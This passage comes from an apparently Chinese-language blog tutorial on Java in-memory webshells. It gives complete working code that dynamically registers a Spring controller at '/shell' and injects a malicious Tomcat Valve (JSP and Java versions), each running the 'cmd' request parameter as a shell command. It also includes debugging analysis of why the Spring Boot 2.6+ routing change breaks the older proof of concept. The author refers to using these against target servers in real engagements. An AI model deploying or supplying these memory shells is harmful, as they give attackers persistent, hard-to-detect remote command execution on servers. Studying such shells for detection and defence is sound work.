后获得。并且我们自定义的 <code>controller</code> 默认没有注入 <code>request</code> 和 <code>response</code> 的问题也可以通过这个方式解决，具体看上面的代码实现就好了。</p><p><img src="/imgs/1694444558104.png"></p><h4 id="高版本Spring动态注册Controller的代码"><a href="#高版本Spring动态注册Controller的代码" class="headerlink" title="高版本Spring动态注册Controller的代码"></a>高版本Spring动态注册Controller的代码</h4><h5 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h5><blockquote><p>两个 <code>poc</code> 本质是一样的，唯一不同之处在于获取 <code>RequestMappingInfo</code> 的方法，低版本的 <code>poc</code> 中直接通过 <code>new</code> 手动创建我们的 <code>RequestMappingInfo</code> ，而第二种 <code>poc</code> 中通过更原始的 <code>build()</code> 方法去获取。</p></blockquote><p>不改的会报下面的错误：</p><p><img src="/imgs/1694448149631.png"></p><p>除非 <code>SpringMVC</code> 有如下配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">pathmatch:</span></span><br><span class="line">      <span class="attr">matching-strategy:</span> <span class="string">ant_path_matcher</span></span><br></pre></td></tr></table></figure><p>这是由于 <code>SpringBoot</code> 对 <a href="https://spring.io/blog/2020/06/30/url-matching-with-pathpattern-in-spring-mvc">路由匹配方式进行修改</a> 。<code>SpringBoot-2.6.0</code> 之后，将默认的路由匹配方式由 <code>ant_path_matcher</code> 改为了 <code>path_pattern_parser</code> 。</p><p>但是实战我们肯定改不了目标服务器的配置文件，因此我们需要用下面高版本的 <code>poc</code> 。</p><h5 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意SpringBoot3中的HttpServletRequest和HttpServletResponse和SpringBoot2中的类路径不一样</span></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01Controller</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo01&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo01</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取当前上下文</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射获得mappingHandlerMapping的config属性，这里是为了后面创建RequestMappingInfo对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="comment">// 通过反射获得恶意类的test方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> EvilController.class.getMethod(<span class="string">&quot;test&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 构造注册信息（与低版本Spring的poc唯一不同的地方）</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用一个构造方法</span></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">evilController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>(<span class="string">&quot;XXX&quot;</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, evilController, method2);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;demo01&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">(String xxx)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span></span><br><span class="line"><span class="comment">//            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span></span><br><span class="line">            <span class="comment">// 获取cmd参数并执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ProcessBuilder p;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    o = c.hasNext() ? c.next() : o;</span><br><span class="line">                    c.close();</span><br><span class="line">                    printWriter.write(o);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    printWriter.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>那到底两种初始化 <code>RequestMappingInfo</code> 对象的方式有什么不同呢？这里我们对比调试分析一下。我们先从终点开始，分析代码为什么会报错。</p><p>报错的位置在 <code>UrlPathHelper#getResolvedLookupPath()</code> 方法中，我们可以知道报错的原因是这里的 <code>lookupPath</code> 为 <code>null</code> 。而 <code>lookupPath</code> 是从 <code>request.getAttribute(PATH_ATTRIBUTE)</code> 获得的，那我们自然而然会想到为什么这里 <code>request</code> 里面没有 <code>PATH_ATTRIBUTE</code> 属性。</p><p><img src="/imgs/1694453851506.png"></p><p>我们可以全局搜索一下哪里出现 <code>PATH_ATTRIBUTE</code> 了，看看哪里对 <code>PATH_ATTRIBUTE</code> 进行了操作。这里找的技巧是优先在当前的函数调用堆栈里面找。</p><p><img src="/imgs/1694454336541.png"></p><p>但是不幸的是，这里在函数栈里面出现的类都没有出现 <code>PATH_ATTRIBUTE</code> 这个字眼。但是经过一个个函数调用栈的回退，我找到了一个可疑的函数调用。</p><p><img src="/imgs/1694454609740.png"></p><p>在 <code>AbstractHandlerMethodMapping#getHandlerInternal()</code> 方法的上面我看到了<code>this.initLookupPath(request)</code> 。这个函数感觉就是给 <code>lookupPath</code> 赋值的，从这个函数中我们或许可以分析 <code>lookupPath</code> 后面为什么为空。</p><p><img src="/imgs/1694454761397.png"></p><p>果然在这个函数中发现了 <code>PATH_ATTRIBUTE</code> 。接着我们在这里下个断点，看看流程是怎么走的。</p><p><img src="/imgs/1694454858643.png"></p><p>我们发现代码走到了 <code>request.removeAttribute(UrlPathHelper.PATH_ATTRIBUTE)</code> 这里，怪不得后面 <code>request.getAttribute(PATH_ATTRIBUTE)</code> 为空，就是这里代码走向出现问题的。我们这里也可以对比实验 <code>debug</code> ，看正确的 <code>poc</code> 会走哪个流程，经过实验发现走的是下面，这也就证实了我的观点。</p><p><img src="/imgs/1694455003805.png"></p><p><img src="/imgs/1694455016557.png"></p><p>根据分析 <code>this.usesPathPatterns()</code> 的函数调用，我们可以得知关键的异常在于 <code>AbstractHandlerMapping.patternParser</code> 。正确的 <code>poc</code> 这里应该让 <code>patternParser</code> 为 <code>null</code> 。但是在高版本如果直接在 <code>poc</code> 中 <code>new RequestMappingInfo()</code> ，就会让代码走到这里 <code>patternParser</code> 不为 <code>null</code> 。</p><p><img src="/imgs/1694455122741.png"></p><p>然后我们查看 <code>patternParser</code> 这个属性的所在位置，果然就发现了原因。</p><p><code>patternParser</code> 在 <code>AbstractHandlerMapping</code> 这个抽象类中，低版本 <code>SpringBoot</code> 这个属性默认没有赋值，而高版本在定义这个属性的时候就直接 <code>new</code> 了对象，因此这个属性才一开始就不为 <code>null</code> 。</p><ul><li>高版本</li></ul><p><img src="/imgs/1694456752673.png"></p><ul><li>低版本</li></ul><p><img src="/imgs/1694456768822.png"></p><blockquote><p>到这里我们算是搞清楚了两个版本之间 <code>poc</code> 不同的原因，那 <code>poc</code> 要怎么修改呢？再继续下面的分析。</p></blockquote><p>接着我们可以创建 <code>requestMappingInfo</code> 的位置打个断点，也就是 <code>RequestMappingHandlerMapping#createRequestMappingInfo()</code> 处，来查看 <code>patternParser</code> 的不同对实际创建 <code>requestMappingInfo</code> 发生了什么影响。</p><p>我们现在这里都用低版本的 <code>poc</code> 来分别在高版本和低版本的 <code>SpringBoot</code> 中 <code>debug</code> 一下。发现高版本的 <code>RequestMappingHandlerMapping.config.patternParser</code> 默认不为 <code>null</code> ，而低版本的为 <code>null</code> 。</p><ul><li>高版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694452875807.png"></p><ul><li>低版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694452899108.png"></p><p>我们再全局搜索一下看 <code>RequestMappingHandlerMapping.config.patternParser</code> 是在哪里被赋值的。最终找到了 <code>RequestMappingHandlerMapping#afterPropertiesSet()</code> 方法中。</p><p>我们发现 <code>SpringBoot</code> 在高版本中对这个方法进行了修改。</p><ul><li>高版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694453433938.png"></p><ul><li>低版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694453463469.png"></p><blockquote><p>这里 <code>config</code> 代码的流程走向变了一是和 <code>afterPropertiesSet()</code> 这个函数的实现变了相关，二是和上面提到的 <code>patternParser</code> 的默认值变了相关。</p></blockquote><h3 id="Tomcat的Valve"><a href="#Tomcat的Valve" class="headerlink" title="Tomcat的Valve"></a>Tomcat的Valve</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>了解 <code>valve</code> 是干什么的先需要了解 <strong>责任链模式</strong> 。参考 <code>https://shusheng007.top/2021/09/08/chain-of-responsibility-pattern/</code> 。</p><blockquote><p><code>Tomcat</code> 在处理一个请求调用逻辑时，是如何处理和传递 <code>Request</code> 和 <code>Respone</code> 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，<code>Tomcat</code> 使用了职责链模式来实现客户端请求的处理。在 <code>Tomcat</code> 中定义了两个接口：<code>Pipeline</code>（管道）和 <code>Valve</code>（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p><code>Pipeline</code> 中会有一个最基础的 <code>Valve</code>（ <code>basic</code> ），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。<code>Pipeline</code> 提供了 <code>addValve</code> 方法，可以添加新 <code>Valve</code> 在 <code>basic</code> 之前，并按照添加顺序执行。</p></blockquote><p><img src="/imgs/Pasted%20image%2020230917232410.png"></p><blockquote><p><code>Tomcat</code> 每个层级的容器（ <code>Engine</code>、<code>Host</code> 、<code>Context</code> 、<code>Wrapper</code> ），都有基础的 <code>Valve</code> 实现（ <code>StandardEngineValve</code> 、<code>StandardHostValve</code> 、<code>StandardContextValve</code> 、<code>StandardWrapperValve</code> ），他们同时维护了一个 <code>Pipeline</code> 实例（ <code>StandardPipeline</code> ），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 <code>Valve</code> 的基础实现都继承了 <code>ValveBase</code> 。这个类帮我们实现了生命接口及 <code>MBean</code> 接口，使我们只需专注阀门的逻辑处理即可。</p></blockquote><p>具体见源码：</p><ul><li><code>StandardEngineValve</code></li></ul><p><img src="/imgs/1694964343246.png"></p><ul><li><code>StandardHostValve</code></li></ul><p><img src="/imgs/1694964391229.png"></p><ul><li><code>StandardWrapperValve</code></li></ul><p><img src="/imgs/1694964456764.png"></p><ul><li><code>StandardWrapperValve</code></li></ul><p><img src="/imgs/1694964425475.png"></p><p>根据上述的描述我们发现，<code>Valve</code> 也可能作为内存马，首先我们需要考虑如何拿到 <code>StandardPipeline</code> ，实际上根据我们调用栈和上文分析很容易发现，在 <code>StandardContext</code> 里就存在 <code>getPipeline()</code> 方法，所以我们老样子只需要拿到 <code>StandardContext</code> 即可。</p><p>最后总结下 <code>Valve</code> 型内存马(即动态创建 <code>valve</code> )的步骤:  </p><ol><li>获取 <code>StandardContext</code> </li><li>继承并编写一个恶意 <code>valve</code>   </li><li>调用 <code>StandardContext.addValve()</code> 添加恶意 <code>valve</code> 实例</li></ol><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><p>这里不知道为什么在 <code>SpringBoot</code> 环境用反序列化打入 <code>java</code> 版本的内存马时总是给对方的服务器打崩了。报错：<code>java.lang.IncompatibleClassChangeError</code> 。但是实际在对方服务器上直接运行这个内存马的时候却是可以成功的。</p><ul><li><code>jsp</code> 版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li><code>java</code> 版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.shellPoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveMemshell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ValveMemshell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意这里的contextClassLoader实际是ParallelWebappClassLoader类型的（WebappClassLoaderBase抽象类的子类），resources属性在WebappClassLoaderBase类中</span></span><br><span class="line">        <span class="comment">// 因此这里获取resources属性需要在其父类去找，getDeclaredField()无法获取父类的属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里jsp和spring的resource路径不一样，jsp只需要一次getSuperclass，SpringBoot需要两次,所以这里最好都试一下</span></span><br><span class="line">            resources = contextClassLoader.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;非SpringBoot环境&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resources = contextClassLoader.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;SpringBoot环境&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e2)&#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            standardRoot = (StandardRoot) resources.get(contextClassLoader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveMemshell</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ValveMemshell</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        